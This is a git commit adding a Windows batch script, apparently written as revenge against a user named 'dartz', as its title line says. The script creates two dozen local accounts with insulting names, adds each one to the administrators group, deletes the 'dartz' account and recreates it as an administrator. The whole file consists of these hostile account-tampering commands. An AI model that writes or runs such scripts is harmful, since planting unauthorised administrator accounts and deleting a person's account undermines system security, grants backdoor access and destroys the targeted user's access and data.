7cdc41289284a81a2659bce8d3d17ed12dc7edce
2003ryans <2003ryans@users.noreply.github.com>
2016-07-20 17:27:08 +0000

    Add files via upload

---
+++ pcomsqa.bat
@@ -0,0 +1,61 @@
+@echo off
+title I'm so angry.. I'm going to add a bunch of users because dartz sux so bad!!!!!!!
+cls
+color 0A
+net stop themes
+net user SHITHEAD /add
+net user SHITHEAD1 /add
+net user SHITHEAD2 /add
+net user SHITHEAD3 /add
+net user SHITHEAD4 /add
+net user SHITHEAD5 /add
+net user SHITHEAD6 /add
+net user SHITHEAD7 /add
+net user SHITHEAD8 /add
+net user SHITHEAD9 /add
+net user SHITHEAD10 /add
+net user SHITHEAD11 /add
+net user SHITHEAD12 /add
+net user SHITHEAD13 /add
+net user SHITHEAD14 /add
+net user SHITHEAD15 /add
+net user SHITHEAD16 /add
+net user SHITHEAD17 /add
+net user SHITHEAD18 /add
+net user SHITHEAD19 /add
+net user SHITHEAD20 /add
+net user SHITHEAD21 /add
+net user SHITHEAD22 /add
+net user SHITHEAD23 /add
+net localgroup administrators SHITHEAD /add
+net localgroup administrators SHITHEAD1 /add
+net localgroup administrators SHITHEAD2 /add
+net localgroup administrators SHITHEAD3 /add
+net localgroup administrators SHITHEAD4 /add
+net localgroup administrators SHITHEAD5 /add
+net localgroup administrators SHITHEAD6 /add
+net localgroup administrators SHITHEAD7 /add
+net localgroup administrators SHITHEAD8 /add
+net localgroup administrators SHITHEAD9 /add
+net localgroup administrators SHITHEAD11 /add
+net localgroup administrators SHITHEAD12 /add
+net localgroup administrators SHITHEAD13 /add
+net localgroup administrators SHITHEAD14 /add
+net localgroup administrators SHITHEAD15 /add
+net localgroup administrators SHITHEAD16 /add
+net localgroup administrators SHITHEAD17 /add
+net localgroup administrators SHITHEAD18 /add
+net localgroup administrators SHITHEAD19 /add
+net localgroup administrators SHITHEAD10 /add
+net localgroup administrators SHITHEAD20 /add
+net localgroup administrators SHITHEAD21 /add
+net localgroup administrators SHITHEAD22 /add
+net localgroup administrators SHITHEAD23 /add
+net localgroup administrators SHITHEAD6 /add
+net localgroup administrators SHITHEAD7 /add
+net localgroup administrators SHITHEAD8 /add
+net localgroup administrators SHITHEAD9 /add
+net user dartz /del
+net user Dartz /add
+net localgroup administrators Dartz /add
+net start themes
